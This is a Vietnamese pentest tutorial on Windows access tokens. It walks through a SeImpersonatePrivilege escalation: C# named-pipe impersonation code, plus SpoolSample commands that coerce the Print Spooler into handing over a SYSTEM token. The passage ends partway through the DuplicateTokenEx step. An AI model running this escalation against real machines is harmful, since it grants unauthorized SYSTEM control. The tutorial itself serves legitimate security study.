![](https://images.viblo.asia/e0a4eab8-d60a-45a2-b873-eaffb6ae41b4.png)
  
Giống như Access Token mà chúng ta thường gặp khi làm việc với Web Application , Windows Access Token được sử dụng để theo dõi các quyền truy cập của người dùng. Phân biệt các đặc quyền của người dùng A với người dùng B, của process A với process B . Trong phần này, chúng ta sẽ tìm hiểu về các access token và cách để tận dụng chúng cho việc leo thang đặc quyền.
  
  # Chạy phát ăn ngay 
  
 Nếu bạn không muốn quan tâm về những thứ bên dưới hay đang gấp gáp trong một bài thi, có thể chạy theo cách ăn liền như sau
  
**Bước 1.** Sử dụng command "**whoami /priv**" và kiểm tra xem tài khoản đang chạy có dòng `SeImpersonatePrivilege - Enable` không 

![](https://images.viblo.asia/8f9ec5f0-ea39-4c18-b91a-9b757474eb39.png)


**Bước 2.** Nếu có, tải [công cụ](https://github.com/itm4n/PrintSpoofer)  này về máy nạn nhân

![](https://images.viblo.asia/19305008-6370-4ef0-876f-508a6634569f.png)

**Bước 3.** Chạy để có quyền SYSTEM  

![](https://images.viblo.asia/2e05b976-78bd-47ef-95d6-6602c3d1dff4.gif)

  
# 1. Lý thuyết tổng Quan

Sau khi người dùng đăng nhập thành công, Windows Access Token sẽ được tạo ra bởi Kernel, nó chứa các giá trị quan trọng liên kết với người dùng cụ thể thông qua SID. Access Token được lưu trữ trong kernel, điều này ngăn chúng ta sửa đổi chúng

Với tư cách là một Pentester, chúng ta tập trung vào 2 khái niệm liên quan tới Access Token : **integrity levels** và **privileges**

Theo đó , Windows có 4 mức integrity bao gồm : **low, medium, high, and system**

* low : dành cho các sandbox của browser (kiểu Google Chrome, Firefox) 
* medium : dành cho các chương trình chạy dưới quyền user thường
* high : dành cho các chương trình chạy dưới quyền admin
* system : dành cho các system service (svchost.exe)

> Không thể cho một Process ở mức toàn vẹn thấp -> lên mức toàn vẹn cao , nhưng ngược lại thì được. 

Local Admin sẽ nhận được 2 Access Token khi xác thực. Đầu tiên (được sử dụng theo mặc định) được cấu hình để tạo ra các process dưới dạng **medium integrity** . Khi người dùng chọn tùy chọn "run as administrator" cho một ứng dụng, access token thứ 2 sẽ được sử dụng thay thế và cho phép tạo ra process dưới dạng **HIGH integrity**

User Account Control (UAC) sẽ liên kết 2 access token này với một người dùng duy nhất và tạo 1 form đồng ý giống giống như này 

[![uac-prompt.png](https://0xbadcode.ml/uploads/images/gallery/2022-05/scaled-1680-/uac-prompt.png)](https://0xbadcode.ml/uploads/images/gallery/2022-05/uac-prompt.png)

Ngoài **integrity**, thì **privileges** cũng được bao gồm trong access token. Chúng là một tập hợp các quyền truy cập hệ điều hành được xác định trước để giới hạn hoạt động của một process.

Có 2 nguyên tắc trong Access Token. 

- Thứ 1 : Không thể sửa đổi Access token thông qua bất kỳ API nào. 
- Thứ 2 : Khi muốn bật/tắt quyền Access Token ta có thể sử dụng **AdjustTokenPrivileges**

Để xem các đặc quyền cho người dùng hiện tại, ta có thể sử dụng flag /priv

![](https://images.viblo.asia/781322b2-eaae-47b9-ab64-211fc7723942.png)

Ta sẽ xem xét qua các đặc quyền có thể sửa đổi access token. Đặc quyền **SeShutdownPrivilege** cho phép người dùng khởi động lại hoặc tắt máy tính. Được hiển thị trong output nó có trong access token nhưng nó đã bị disable.

Nếu chúng ta chọn tắt máy tính thông qua lệnh **shutdown**, back-end sẽ kích hoạt đặc quyền **AdjustTokenPrivileges** sau đó thực hiện các hành động cần thiết để tắt hệ điều hành.

Mặc dù không thể sửa đổi các đặc quyền được liên kết với một session đang hoạt động, ta có thể thêm các đặc quyền bổ sung và sẽ có hiệu lực khi chúng ta đăng xuất sau đó đăng nhập lại. Điều này có thể thực hiện thông qua **LsaAddAccountRights** , nhưng thường nó sẽ được thực hiện thông qua group policy **secpol.msc**.

[![ZNhScreenshot_1.png](https://0xbadcode.ml/uploads/images/gallery/2022-05/scaled-1680-/ZNhScreenshot_1.png)](https://0xbadcode.ml/uploads/images/gallery/2022-05/ZNhScreenshot_1.png)

Đặc quyền như trong ảnh (SeLoadDriverPrivilege) mang lại quyền load drive kernel. Nếu chúng ta áp dụng đặc quyền này cho người dùng của mình, Access token sẽ không được sửa đổi, thay vào đó Access token mới sẽ được tạo ngay sau khi người dùng đăng xuất và đăng nhập lại.

Chúng ta chú ý tới đặc quyền **"impersonation token"** , cho phép người dùng hành động thay mặt người dùng khác mà không cần thông tin đăng nhập của người đó. Có 4 cấp độ cho dạng access token này bao gồm :  Anonymous (nặc danh) , Identification, Impersonation (mạo danh), and Delegation (Ủy quyền).

**Impersonation** như tên của nó. cho phép mạo danh danh tính của client , trong khi **Delegation (ủy quyền)** cho phép thực hiện kiểm tra kiểm soát truy cập tuần tự trên nhiều máy. Điều này là rất quan trọng với chức năng của các ứng dụng phân tán. ví dụ giả sử người dùng xác thực máy chủ web và thực hiện một số hành động trên máy chủ đó, yêu cầu tra cứu cơ sở dữ liệu.  Web Server có thể sử dụng ủy quyền để chuyển xác thực tới máy chủ CSDL thông qua máy chủ web.

# 2. Leo thang đặc quyền với Impersonation

Trong nội dung trước, chúng ta đã thảo luận về cách các đặc quyền của Access Token quyết định quyền truy cập của người dùng được xác thực như nào. Bây giờ chúng ta sẽ cùng nhau tìm hiểu cách chúng ta có thể tận dụng một số đặc quyền để tiến hành leo thang hệ thống.

Trước đây, các nhà nghiên cứu bảo mật đã xác định được 9 đặc quyền khác nhau có thể cho phép nâng cấp đặc quyền từ medium integrity lên HIGH integrity hay chạy dưới tư cách của một người dùng đã xác thực khác.

9 đặc quyền đó bao gồm

```bash
SeImpersonatePrivilege
SeAssignPrimaryPrivilege
SeTcbPrivilege
SeBackupPrivilege
SeRestorePrivilege
SeCreateTokenPrivilege
SeLoadDriverPrivilege
SeTakeOwnershipPrivilege
SeDebugPrivilege
```

Trong module này, chúng ta chỉ tập trung vào **SeImpersonatePrivilege**

## 2.1. SeImpersonatePrivilege

SeImpersonatePrivilege cho phép chúng ta mạo danh bất kỳ access token nào mà chúng ta có thể lấy reference hoặc hanlde.  Đặc quyền này khá thú vị vì tài khoản  Network Service, LocalService và IIS account được gán theo mặc định. Do đó, việc thực thi mã trên máy chủ web thường sẽ cấp cho chúng ta vào đặc quyền này , giúp tăng khả năng leo thang đặc quyền trên hệ thống.

Nếu sở hữu **SeImpersonatePrivilege** chúng ta có thể sử dụng API **DuplicateTokenEx** để tạo access token mới từ access token mạo danh và tạo một process mới với quyền của người dùng bị mạo danh. 

> Trong trường hợp chúng ta không có access token nào liên quan tới các tài khoản người dùng khác trong bộ nhớ, chúng ta có thể buộc tài khoản SYSTEM cung cấp cho chúng ta access token mà ta có thể tiến hành mạo danh


Để tận dụng đặc quyền **SeImpersonatePrivilege** chúng ta sẽ sử dụng một cuộc tấn công post-exploit dựa trên Windows pipes

> Pipe là một phương tiện giao tiếp interprocess communication (IPC) giống như RPC, COM hoặc thậm chí là Network Socket

Pipe là một phần của shared memory bên trong kernel mà các tiến trình có thể sử dụng để giao tiếp. Một process có thể tạo một Pipe trong khi các process khác có thể kết nối với Pipe và đọc/ghi thông tin đến từ nó. Tùy thuộc vào quyền truy cập được cấu hình cho Pipe nhất định

Có 2 loại pipe bao gồm "Named pipe" và "Anonymous pipe". Anonymous pipe được sử dụng làm kênh giao tiếp giữa process cha và process con. Named pipe được sử dụng rộng rãi hơn và quan trọng nó hỗ trợ impersonation

> Cuộc tấn công mà sắp tới chúng ta sắp mô phỏng có thể buộc tài khoản SYSTEM kết nối với **named pipe** do kẻ tấn công thiết lập. Mặc dù ban đầu kỹ thuật này được phát triển như một phần của cuộc tấn công Active Directory, nhưng nó cũng có thể được sử dụng ở mức local. Nó khai thác điểm yếu của "print spooler service" , được khởi chạy mặc định với quyền SYSTEM mặc định. 

Print spooler giám sát các thay đổi tới các máy in bằng cách kết nối với các named pipe tương ứng của chúng.  Nếu chúng ta có thể tạo ra một process chạy với đặc quyền "SeImpersonatePrivilege" mô phỏng ứng dụng máy in, chúng ta có thể nhận được Access token SYSTEM mà chúng ta có thể mạo danh.

Để chứng minh điều này, chúng ta tạo một ứng dụng C# Pipe Server (máy in). Chờ kết nối và cố gắng mạo danh máy kết nối với nó. 

Thành phần quan trọng đầu tiên của cuộc tấn công này là API **ImpersonateNamedPipeClient** , cho phép mạo danh access token từ account kết nối với pipe nếu server có **SeImpersonatePrivilege**. Khi **ImpersonateNamedPipeClient** được gọi, 
chương trình sẽ sử dụng access token mạo danh, thay vì access token mặc định của nó.

Để tạo ra chương trình, ban đầu chúng ta sẽ phải sử dụng các API Win32 **CreateNamedPipe**, **ConnectNamedPipe** và **ImpersonateNamedPipeClient**.

CreateNamedPipe như tên của nó, giúp ta tạo một pipe. Nguyên mẫu của nó được định dạng như sau


```
HANDLE CreateNamedPipeA(
  LPCSTR                lpName,
  DWORD                 dwOpenMode,
  DWORD                 dwPipeMode,
  DWORD                 nMaxInstances,
  DWORD                 nOutBufferSize,
  DWORD                 nInBufferSize,
  DWORD                 nDefaultTimeOut,
  LPSECURITY_ATTRIBUTES lpSecurityAttributes
);
```

API này chấp nhận một số tham số tương đối đơn giản. Đầu tiên và cũng là quan trọng nhất **lpName** là tên của Pipe. Tất cả các Named Pipes phải tuân theo một định dạng chuẩn (chẳng hạn như **\\.\pipe\fuho**) đồng thời nó phải là duy nhất trên hệ thống 

* Đối số thứ 2 (dwOpenMode) mô tả các thức mà pipe được mở. Chúng ta sẽ chỉ định Pipe với enum PIPE_ACCESS_DUPLEX tương đương với giá trị 3. 

* Đối số thứ 3 (dwPipeMode) mô tả cách thức mà pipe hoạt động. Chúng ta sẽ chỉ định PIPE_TYPE_BYTE  để đọc và ghi trực tiếp các byte cùng với PIPE_WAIT để bật chế độ block. Điều này sẽ cho phép chúng ta nghe trên Pipe cho đến khi nó nhận được một kết nối. Chúng ta sẽ chỉ định sự kết hợp của 2 mode này với giá trị "0".

* Đối số thứ 4 (nMaxInstances) quy định số lượng tối đa cho Pipe được chỉ định. Điều này chủ yếu được sử dụng để đảm bảo hiệu quả trong các ứng dụng lớn hơn. Bất kỳ giá trị nào từ 1 tới 255 đều phù hợp với chúng ta. 

* Đối số "nOutBufferSize" và "nInBufferSize" xác định số byte để sử dụng cho buffer input và ouput. Chúng ta sẽ chọn memory page là (0x1000 bytes)


* Đối số nDefaultTimeOut xác định thời gian chờ mặc định (đợi kết nối). Vì chúng ta đang sử dụng một Pipe hoạt động vô hạn nên chúng ta không quan tâm tới điều này, có thể đặt mặc định thành 0. 

* Đố số lpSecurityAttributes quy định chi tiết client nào có thể tương tác với Pipe thông qua SID. Chúng ta đặt giá trị này thành Null để cho phép "mọi người" truy cập vào nó

Tham số sau khi thỏa mãn yêu cầu sẽ như sau ```CreateNamedPipe(pipeName, 3, 0, 10, 0x1000, 0x1000, 0, IntPtr.Zero);```

Code như sau

```csharp
using System;
using System.Runtime.InteropServices;

namespace PrintSpooferNet
{
    class Program
    {
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr CreateNamedPipe(string lpName, uint dwOpenMode, uint dwPipeMode, uint nMaxInstances, uint nOutBufferSize, uint nInBufferSize, uint nDefaultTimeOut, IntPtr lpSecurityAttributes);

        static void Main(string[] args)
        {
            if (args.Length == 0)
            {
                Console.WriteLine("Usage: PrintSpooferNet.exe pipename");
                return;
            }
            string pipeName = args[0];
            IntPtr hPipe = CreateNamedPipe(pipeName, 3, 0, 10, 0x1000, 0x1000, 0, IntPtr.Zero);
        }
    }
}

```

Sau khi tạo thành công Pipe, chúng ta tiến hành **ConnectNamedPipe**. Hàm này được sử dụng như sau

```
BOOL ConnectNamedPipe(
  HANDLE       hNamedPipe,
  LPOVERLAPPED lpOverlapped
);
```

Tham số đầu tiên **hNamedPipe** là một handler với Pipe được return từ **CreateNamedPipe**. Tham số thứ 2 (lpOverlapped) là một con trỏ đến một cấu trúc được sử dụng trong các trường hợp nâng cao hơn. Trong trường hợp này, ta đơn giản đặt thành NULL

Code như sau

```
[DllImport("kernel32.dll")]
static extern bool ConnectNamedPipe(IntPtr hNamedPipe, IntPtr lpOverlapped);
...
ConnectNamedPipe(hPipe, IntPtr.Zero);
```

Sau khi chúng ta gọi **ConnectNamedPipe** ứng dụng sẽ đợi bất kỳ thằng nào kết nối tới. Sau khi kết nối thành công, chúng ta sẽ gọi **ImpersonateNamedPipeClient** để mạo danh client

ImpersonateNamedPipeClient chấp nhận hander pipe làm đối số duy nhất của nó . Nguyên mẫu như sau

```
BOOL ImpersonateNamedPipeClient(
  HANDLE hNamedPipe
);
```
Tra cứu trên pinvoke, ta có cấu trúc

```
[DllImport("Advapi32.dll")]
static extern bool ImpersonateNamedPipeClient(IntPtr hNamedPipe);
```
Tại thời điểm này. mã của chúng sẽ khởi động một server Pipe, lắng nghe các kết nối tới và mạo danh chúng

Code như sau

```csharp
using System;
using System.Runtime.InteropServices;

namespace PrintSpooferNet
{
    class Program
    {
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr CreateNamedPipe(string lpName, uint dwOpenMode, uint dwPipeMode, uint nMaxInstances, uint nOutBufferSize, uint nInBufferSize, uint nDefaultTimeOut, IntPtr lpSecurityAttributes);
        
        [DllImport("kernel32.dll")]
static extern bool ConnectNamedPipe(IntPtr hNamedPipe, IntPtr lpOverlapped);

[DllImport("Advapi32.dll")]
static extern bool ImpersonateNamedPipeClient(IntPtr hNamedPipe);

        static void Main(string[] args)
        {
            if (args.Length == 0)
            {
                Console.WriteLine("Usage: PrintSpooferNet.exe pipename");
                return;
            }
            string pipeName = args[0];
            IntPtr hPipe = CreateNamedPipe(pipeName, 3, 0, 10, 0x1000, 0x1000, 0, IntPtr.Zero);
            ConnectNamedPipe(hPipe, IntPtr.Zero);
            ImpersonateNamedPipeClient(hPipe);

        }
    }
}

```

Nếu mọi thứ hoạt động chính xác, **ImpersonateNamedPipeClient** sẽ lấy access token mạo danh cho user kết nối tới. Nhưng chúng ta hiện chưa có cách nào để "thấy" điều này, cần phải code thêm tính năng để xác nhận nó.

Để xác minh sự thành công của cuộc tấn công. Chúng ta có thể mở access token bằng hàm  "OpenThreadToken" và sau đó sử dụng "GetTokenInformation" để lấy được SID được liên kết với access token. Cuối cùng ta gọi "ConvertSidToStringSid" để chuyển đổi SID thành một chuỗi SID mà người có thể đọc được.

> Mặc dù điều này không giúp ích gì tới khả năng khai thác, nhưng nó giúp ta hiểu thêm về cuộc tấn công

Nguyên mẫu hàm cho "OpenThreadToken" được hiển thị như sau

```csharp
BOOL OpenThreadToken(
  [in]  HANDLE  ThreadHandle,
  [in]  DWORD   DesiredAccess,
  [in]  BOOL    OpenAsSelf,
  [out] PHANDLE TokenHandle
);
```

Đầu tiên, chúng ta phải cung cấp một handle cho thread (ThreadHandle) được link với access token. Vì thread này chính là thread hiện tại, nên chúng ta sẽ sử dụng luôn API Win32 **GetCurrentThread** không yêu cầu bất cứ đối số nào. 

Tiếp theo, chúng ta phải chỉ định mức độ truy cập **DesiredAccess**, tốt nhất là nên "chmod 777" - yêu cầu tối đa quyền với "TOKEN_ALL_ACCESS" tương ứng với 0xF01FF.

OpenAsSelf chỉ định liệu API có nên sử dụng ngữ cảnh bảo mật của quy trình hay không. Vì chúng tôi muốn sử dụng access token mạo danh, chúng tôi sẽ đặt giá trị này thành false.

Cuối cùng chúng ta phải cung cấp một pointer "TokenHandle", con trỏ này được ghi vào access token khi được open

Code như sau 

```csharp
[DllImport("kernel32.dll")]
private static extern IntPtr GetCurrentThread();

[DllImport("advapi32.dll", SetLastError = true)]
static extern bool OpenThreadToken(IntPtr ThreadHandle, uint DesiredAccess, bool OpenAsSelf, out IntPtr TokenHandle);


IntPtr hToken;
OpenThreadToken(GetCurrentThread(), 0xF01FF, false, out hToken);

```

Tiếp theo, chúng ta sẽ gọi **GetTokenInformation** API , API này trả về nhiều loại thông tin, nhưng chúng ta chỉ cần lấy SID. Nguyên mẫu hàm này như sau

```csharp
BOOL GetTokenInformation(
  [in]            HANDLE                  TokenHandle,
  [in]            TOKEN_INFORMATION_CLASS TokenInformationClass,
  [out, optional] LPVOID                  TokenInformation,
  [in]            DWORD                   TokenInformationLength,
  [out]           PDWORD                  ReturnLength
);
```

Đối số đầu tiên "TokenHandle" là access token chúng ta thu được từ "OpenThreadToken" 

Đối số thứ 2 "TokenInformationClass" chỉ định loại thông tin mà chúng ta muốn lấy. Vì chúng ta chỉ muốn có SID, nên tham số có thể đặt là 1.

TokenInformation là một con trỏ đến buffer ,ouput sẽ được điền bởi API và **TokenInformationLength** là kích thước của buffer đầu ra. Vì chúng ta không biết chính xác kích thước của buffer, nên cách sử dụng API được khuyến nghị gọi 2 lần. Lần đầu tiên chúng ta đặt giá trị  đối số này tương ứng với NULL và 0. ReturnLength sẽ được điền với kích thước yêu cầu.

Sau đó, chúng ta có thể cấp phát một buffer thích hợp và gọi API lần thứ 2. Code như sau

```csharp
[DllImport("advapi32.dll", SetLastError=true)]
static extern bool GetTokenInformation(
    IntPtr TokenHandle,
    TOKEN_INFORMATION_CLASS TokenInformationClass,
    IntPtr TokenInformation,
    uint TokenInformationLength,
    out uint ReturnLength);
```

```csharp
int TokenInfLength = 0;
GetTokenInformation(hToken, 1, IntPtr.Zero, TokenInfLength, out TokenInfLength);
IntPtr TokenInformation = Marshal.AllocHGlobal((IntPtr)TokenInfLength);
GetTokenInformation(hToken, 1, TokenInformation, TokenInfLength, out TokenInfLength);
```

> Để phân bổ buffer "TokenInformation", chúng ta sẽ sử dụng phương thức `.Net Marshal.AllocHGlobal`, có thể cấp phát bộ nhớ unmanaged

Bước cuối cùng, chúng ta sẽ sử dụng "ConvertSidToStringSid" để chuyển đổi SID binary thành chuỗi SID mà chúng ta có thể đọc. Nguyên mẫu của hàm này như sau

```csharp
BOOL ConvertSidToStringSidW(
  PSID   Sid,
  LPWSTR *StringSid
);
```

Đối số đầu tiên (SID) là một pointer tới SID. SID nằm trong buffer ouput đã được GetTokenInformation lấy ra, nhưng chúng ta phải giải nén nó trước.

Một cách để làm điều này là xác định struct TOKEN_USER (là một phần của Token_information_class) được GetTokenInformation sử dụng. Sau đó điều khiển một con trỏ tới nó bằng "Marshal.PtrToStructure".

Đối với tham số cuối cùng (StringSid) chúng ta sẽ cung cấp chuỗi đầu ra. Ở đây chúng ta có thể chỉ cần cung cấp một con trỏ trống và khi nó được ghi vào, hãy điều chỉnh nó thành một string với **Marshal.PtrToStringAuto**.

Code như sau

```csharp
using System;
using System.Runtime.InteropServices;

namespace ConsoleApp1
{

    class Program
    {

        [StructLayout(LayoutKind.Sequential)]
        public struct SID_AND_ATTRIBUTES
        {
            public IntPtr Sid;
            public int Attributes;
        }

        public struct TOKEN_USER
        {
            public SID_AND_ATTRIBUTES User;
        }

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr CreateNamedPipe(string lpName, uint dwOpenMode, uint dwPipeMode, uint nMaxInstances, uint nOutBufferSize, uint nInBufferSize, uint nDefaultTimeOut, IntPtr lpSecurityAttributes);

        [DllImport("kernel32.dll")]
        static extern bool ConnectNamedPipe(IntPtr hNamedPipe, IntPtr lpOverlapped);

        [DllImport("Advapi32.dll")]
        static extern bool ImpersonateNamedPipeClient(IntPtr hNamedPipe);

        [DllImport("kernel32.dll")]
        private static extern IntPtr GetCurrentThread();

        [DllImport("advapi32.dll", SetLastError = true)]
        static extern bool OpenThreadToken(IntPtr ThreadHandle, uint DesiredAccess, bool OpenAsSelf, out IntPtr TokenHandle);

        [DllImport("advapi32.dll", SetLastError = true)]
        static extern bool GetTokenInformation(IntPtr TokenHandle, uint TokenInformationClass, IntPtr TokenInformation, int TokenInformationLength, out int ReturnLength);

        [DllImport("advapi32", CharSet = CharSet.Auto, SetLastError = true)]
        static extern bool ConvertSidToStringSid(IntPtr pSID, out IntPtr ptrSid);

        static void Main(string[] args)
        {
            if (args.Length == 0)
            {
                Console.WriteLine("Usage: PrintSpooferNet.exe pipename");
                return;
            }
            string pipeName = args[0];
            IntPtr hPipe = CreateNamedPipe(pipeName, 3, 0, 10, 0x1000, 0x1000, 0, IntPtr.Zero);
            ConnectNamedPipe(hPipe, IntPtr.Zero);
            ImpersonateNamedPipeClient(hPipe);

            IntPtr hToken;
            OpenThreadToken(GetCurrentThread(), 0xF01FF, false, out hToken);

            int TokenInfLength = 0;
            GetTokenInformation(hToken, 1, IntPtr.Zero, TokenInfLength, out TokenInfLength);
            IntPtr TokenInformation = Marshal.AllocHGlobal((IntPtr)TokenInfLength);
            GetTokenInformation(hToken, 1, TokenInformation, TokenInfLength, out TokenInfLength);

            TOKEN_USER TokenUser = (TOKEN_USER)Marshal.PtrToStructure(TokenInformation, typeof(TOKEN_USER));
            IntPtr pstr = IntPtr.Zero;
            Boolean ok = ConvertSidToStringSid(TokenUser.User.Sid, out pstr);
            string sidstr = Marshal.PtrToStringAuto(pstr);
            Console.WriteLine(@"Found sid {0}", sidstr);

        }
    }
}
```

> Câu lệnh "Console.WriteLine(@"Found sid {0}", sidstr);"  sẽ in cho chúng ta SID được liên kết với access token, từ đó cho biết ta đã mạo danh người dùng nào.


Như đã đề cập ở đầu chương trình, chúng ta phải thực thi mã trong ngữ cảnh tài khoản của người dùng có quyền truy cập 'SeImpersonatePrivilege'. Để thử nghiệm cuộc tấn công, chúng ta sẽ đăng nhập vào server nạn nhân với tư cách admin , sau đó dùng PsExec để "su" sang tài khoản Network Service.


```
C:\Tools\chien> psexec64 -i -u "NT AUTHORITY\Network Service" cmd.exe
```

Xác minh User và quyền của nó

[![Screenshot-from-2022-05-23-23-13-21.png](https://0xbadcode.ml/uploads/images/gallery/2022-05/scaled-1680-/Screenshot-from-2022-05-23-23-13-21.png)](https://0xbadcode.ml/uploads/images/gallery/2022-05/Screenshot-from-2022-05-23-23-13-21.png)


## 2.2. Biên dịch và chạy mã

Bước 1. Tạo một Pipe ngẫu nhiên và duy nhất trên hệ thống


```
C:\Tools>PrintSpooferNet.exe \\.\pipe\hoanx
```
> Sử dụng C:\\tools vì đây là thư mục share cho user hiện tại có thể truy cập

Bước 2. Sử dụng với cmd của admin, connect tới Pipe

```
C:\Users\Administrator>echo haha > \\localhost\pipe\hoanx
```

Khi kết nối thành công, ta nhận được SID của administrator, chứng tỏ ta đã có quyền can thiệp vào user này (và bật kì user nào khác kết nối tới Pipe)

[![Screenshot-from-2022-05-24-00-13-12.png](https://0xbadcode.ml/uploads/images/gallery/2022-05/scaled-1680-/Screenshot-from-2022-05-24-00-13-12.png)](https://0xbadcode.ml/uploads/images/gallery/2022-05/Screenshot-from-2022-05-24-00-13-12.png)

> Ảnh so sánh SID của administrator - chứng tỏ cùng một thằng

[![Screenshot-from-2022-05-24-00-04-06.png](https://0xbadcode.ml/uploads/images/gallery/2022-05/scaled-1680-/Screenshot-from-2022-05-24-00-04-06.png)](https://0xbadcode.ml/uploads/images/gallery/2022-05/Screenshot-from-2022-05-24-00-04-06.png)

Ở ví dụ trên ta thấy được một hạn chế, đó là để có được access token của admin , ta buộc phải "chờ" admin tự động kết nối vào Pipe của mình. Điều này trong thực tế là rất khó xảy ra. Do đó, ta cần lợi dụng một chương trình chạy với quyền SYSTEM mặc định và ép được nó kết nối tới Pipe "độc hại". Print Spooler thỏa mãn điều kiện này 

[![Tạo-ảnh-đẹp.jpg](https://0xbadcode.ml/uploads/images/gallery/2022-05/scaled-1680-/Tạo-ảnh-đẹp.jpg)](https://0xbadcode.ml/uploads/images/gallery/2022-05/Tạo-ảnh-đẹp.jpg)

Print Spooler giao tiếp sử dụng giao thức Print System Remote Protocol (MS-RPRN) được phát triển từ năm 2007, MS-RPRN hoạt động thông qua các named pipe - \pipe\spools

Khả năng lạm dụng đến từ các chức năng *RpcOpenPrinter* và *RpcRemoteFindFirstPrinterChangeNotification*.  *RpcOpenPrinter*  cho phép chúng ta truy xuất một handler cho server print. Được sử dụng đối số cho API sau này.

*RpcRemoteFindFirstPrinterChangeNotification* về cơ bản giám sát các thay đổi của máy in, đồng thời gửi thông báo thay đổi tới client print. 

**Thông báo thay đổi này yêu cầu print spooler truy cập client print. Nếu chúng ta đảm bảo rằng, client print sử dụng named pipe của chúng ta, nó sẽ nhận được access token mức SYSTEM mà chúng ta có thể mạo danh**

Tuy nhiên, không giống như các API Win32 thông thường, cá API MS-RPRN không thể được gọi trực tiếp. Chức năng print spooler nằm trong thư viện *RpcRT4.dll* được gọi thông qua hàm *NdrClientCall* sử dụng các binary để tương tác. Do đó để tự phát triển là rất khó khăn 

Đến đây, chúng ta phải sử dụng công cụ được cung cấp sẵn để hoàn tất công việc hiện tại - SpoolSample.exe

> SpoolSample và toàn bộ kỹ thuật Print spooler được phát triển để sử dụng trong Active Directory chứ không được thiết kế trong môi trường local

Khi chúng ta sử dụng SpoolSample.exe , chúng ta phải chỉ định tên của máy chủ để kết nối (nạn nhân) và tên của máy chủ ta đang kiểm soát (kẻ tấn công). Vì chúng ta đang thực hiện trên cùng một máy, nên 2 máy chủ này giống nhau (tự gọi cho chính mình). Điều này càng khó khăn hơn khi Print Spooler chạy với quyền SYSTEM và cần liên hệ với client print theo một pipe mặc định (**pipe\spoolss**)

Chúng ta thử tiến hành phân tích qua một chút với Process Monitor khi chạy SpoolSample.exe với một Pipe được gán tùy ý

Đầu tiên, chúng ta cấu hình Process Monitor sniff "spoolsv.exe" để lọc ra tất cả những hoạt động của chương trình này khi sử dụng SpoolSample.exe. Sau đó chúng ta thực thi SpoolSample.exe với tên của máy chủ hiện tại và Pipe là một giá trị ngẫu nhiên

```
C:\Tools> SpoolSample.exe srv01 srv01\test
```

[![Screenshot-from-2022-05-24-20-27-56.png](https://0xbadcode.ml/uploads/images/gallery/2022-05/scaled-1680-/Screenshot-from-2022-05-24-20-27-56.png)](https://0xbadcode.ml/uploads/images/gallery/2022-05/Screenshot-from-2022-05-24-20-27-56.png)

Mặc dù ouput của SpoolSample.exe cho biết quá trình thành công, tuy nhiên không có kết nối nào từ sploolss cả. Điều này là do, trước khi cố gắng truy cập vào Pipe , Print Spooler đã xác thực trước pipe và đảm bảo rằng nó khớp với tên mặc định "pipe\spoolss". Mặt khác, mỗi pipe là duy nhất thế hệ thống, do đó ta không thể đặt tên "spools" là tên pipe của mình.


[![Tạo-ảnh-đẹp.png](https://0xbadcode.ml/uploads/images/gallery/2022-05/scaled-1680-/Tạo-ảnh-đẹp.png)](https://0xbadcode.ml/uploads/images/gallery/2022-05/Tạo-ảnh-đẹp.png)

Tuy nhiên, bypass việc này không hề khó. Jonaslyk (1 thằng Hacker) đã phát hiện ra rằng, khi chúng ta cung cấp cho SpoolSample một tên pipe tùy ý - có chứa dấu "gạch ngược" thì Print Spooler sẽ thêm pipe mặc định "pipe\spoolss" vào pipe riêng của chúng ta trước khi tiến hành xử lý nó.


```
Bản gốc "srv01\test" ---> xử lý "srv01\test" // không thỏa mãn điều kiện của Print Spooler
```
```
Bản bypass "srv01/test" ---> Xử lý "srv01\test\pipe\spoolss"
```

Quá trình chuyển đổi này gồm 2 bước : 
- Bước 1 : Path chúng ta cung cấp (**srv01/test**) sẽ được chuyển sang dạng chuẩn (**srv01\test**)
- Bước 2 : spoolsv.exe  sẽ cố gắng truy cập vào pipe có tên **\\.\srv01\test\pipe\spoolss**

Do pipe mới kết thúc với **pipe\spoolss** phù hợp với Pipe mặc định của Print Spooler , nên sẽ vượt qua được quá trình authen.

Để xác minh lại điều này, ta thực hiện lại ví dụ bên trên, nhưng thay `/` sang `\` 

```
C:\Tools> SpoolSample.exe srv01 srv01/test
[+] Converted DLL to shellcode
[+] Executing RDI
[+] Calling exported function
TargetServer: \\srv01, CaptureServer: \\srv01/test
RpcRemoteFindFirstPrinterChangeNotificationEx failed.Error Code 1707 - The network address is invalid.
```

Tại thời điểm này, chúng ta chỉ cần tạo một Pipe mô phỏng máy in. Khi thực thi SpoolSample , Print Spooler sẽ tự động kết nối với Pipe độc hại.

Tạo Pipe Server :

```
C:\Tools> PrintSpooferNet.exe \\.\pipe\test\pipe\spoolss

```

Dùng SpoolSample để ép Print Spooler kết nối với Pipe

```
C:\Tools> SpoolSample.exe srv01 srv01/pipe/test
[+] Converted DLL to shellcode
[+] Executing RDI
[+] Calling exported function
TargetServer: \\srv01, CaptureServer: \\srv01/pipe/test
RpcRemoteFindFirstPrinterChangeNotificationEx failed.Error Code 1722 - The RPC server is unavailable.
```


[![Screenshot-from-2022-05-25-00-07-30.png](https://0xbadcode.ml/uploads/images/gallery/2022-05/scaled-1680-/Screenshot-from-2022-05-25-00-07-30.png)](https://0xbadcode.ml/uploads/images/gallery/2022-05/Screenshot-from-2022-05-25-00-07-30.png)


Ứng dụng tìm được SID của SYSTEM, chứng tỏ ra đã ép được SYSTEM "login" vào pipe của chúng ta mà không cần bất kỳ sự tương tác nào.

Như vậy, ta đã có được Access token mạo danh của SYSTEM, giờ là lúc tìm các tận dụng nó.

Bước đầu tiên để tận dụng được Access token mạo danh, chúng ta phải sử dụng **DuplicateTokenEx** chuyển đổi access token mạo danh thành access token primary.


Nguyên mẫu của hàm này như sau

```csharp
BOOL DuplicateTokenEx(
  HANDLE                       hExistingToken,
  DWORD                        dwDesiredAccess,
  LPSECURITY_ATTRIBUTES        lpTokenAttributes,
  SECURITY_IMPERSONATION_LEVEL ImpersonationLevel,
  TOKEN_TYPE                   TokenType,
  PHANDLE                      phNewToken
);
```

DLL Import 

```csharp
[DllImport("advapi32.dll", CharSet=CharSet.Auto, SetLastError=true)]
public extern static bool DuplicateTokenEx(
    IntPtr hExistingToken,
    uint dwDesiredAccess,
    ref SECURITY_ATTRIBUTES lpTokenAttributes,
    SECURITY_IMPERSONATION_LEVEL ImpersonationLevel,
    TOKEN_TYPE TokenType,
    out IntPtr phNewToken );
```

- Đối số đầu tiên "hExistingToken" ta cung cấp đối số = hToken

